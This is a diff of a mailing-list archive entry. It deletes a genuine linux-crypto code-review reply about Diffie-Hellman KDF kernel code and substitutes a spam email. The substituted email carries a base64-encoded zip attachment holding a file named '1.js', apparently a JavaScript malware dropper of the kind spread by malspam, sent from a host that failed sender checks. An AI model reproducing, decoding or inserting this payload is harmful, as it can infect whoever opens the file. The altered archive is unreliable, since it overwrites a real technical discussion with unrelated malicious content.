@@ -1,58 +1,61 @@
-From: Mat Martineau <mathew.j.martineau@linux.intel.com>
-Subject: Re: [PATCH v2] KEYS: add SP800-56A KDF support for DH
-Date: Fri, 5 Aug 2016 09:08:59 -0700 (PDT)
-Message-ID: <alpine.OSX.2.20.1608050858270.69454@mjmartin-mac01.local>
-References: <2239809.KsND40bFeW@positron.chronox.de> <alpine.OSX.2.20.1608041258050.55029@mjmartin-mac01.local> <7993056.4BOhkDi2U3@positron.chronox.de>
+From: <jmorrell@lionhrtpub.com>
+Subject: RE: linux-crypto
+Date: Fri, 5 Aug 2016 13:14:45 -0400
+Message-ID: <000101d1ef6f$21ece8a4$c0a80001@consultingpartners.com.ar>
+Reply-To: <linux-crypto@vger.kernel.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=US-ASCII; format=flowed
-Cc: David Howells <dhowells@redhat.com>, keyrings@vger.kernel.org,
-	linux-crypto@vger.kernel.org
-To: Stephan Mueller <smueller@chronox.de>
+Content-Type: application/zip; name="mluopbbubhxh_linux-crypto.zip"
+Content-Transfer-Encoding: base64
+To: "linux-crypto" <linux-crypto@vger.kernel.org>
 Return-path: <linux-crypto-owner@vger.kernel.org>
-Received: from mga09.intel.com ([134.134.136.24]:36748 "EHLO mga09.intel.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1759807AbcHEQJC (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
-	Fri, 5 Aug 2016 12:09:02 -0400
-In-Reply-To: <7993056.4BOhkDi2U3@positron.chronox.de>
+Received: from consultingpartners.com.ar ([190.2.36.61]:36814 "HELO
+	consultingpartners.com.ar" rhost-flags-OK-FAIL-OK-FAIL)
+	by vger.kernel.org with SMTP id S1752141AbcHEROp (ORCPT
+	<rfc822;linux-crypto@vger.kernel.org>);
+	Fri, 5 Aug 2016 13:14:45 -0400
+Content-Disposition: attachment
 Sender: linux-crypto-owner@vger.kernel.org
 List-ID: <linux-crypto.vger.kernel.org>
 
-
-On Fri, 5 Aug 2016, Stephan Mueller wrote:
-
-> Am Donnerstag, 4. August 2016, 13:41:58 CEST schrieb Mat Martineau:
->
-> Hi Mat,
->
->>> +
->>> +long keyctl_dh_compute(struct keyctl_dh_params __user *params,
->>> +		       char __user *buffer, size_t buflen,
->>> +		       struct keyctl_kdf_params __user *kdf)
->>> +{
->>> +	struct keyctl_kdf_params kdfcopy;
->>> +
->>> +	if (!kdf)
->>> +		return __keyctl_dh_compute(params, buffer, buflen, NULL);
->>> +
->>> +	if (copy_from_user(&kdfcopy, kdf, sizeof(kdfcopy)) != 0)
->>> +		return -EFAULT;
->>> +
->>> +	return __keyctl_dh_compute(params, buffer, buflen, &kdfcopy);
->>
->> I'd find this more readable if there was one call to __keyctl_dh_compute.
->
-> When trying to implement it, I think that it would even be more confusing,
-> because we need a conditional in any case. Do you like
->
-> return __keyctl_dh_compute(params, buffer, buflen, (kdf) ? &kdfcopy : NULL);
->
-> better than the already presented code? Besides, this would now imply that we
-> have two conditionals instead of one.
-
-Another approach that uses one conditional is to add a struct 
-keyctl_kdf_params* variable and assign it in the conditional block. Maybe 
-that's not much of a win, it's up to you.
-
---
-Mat Martineau
-Intel OTC
+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
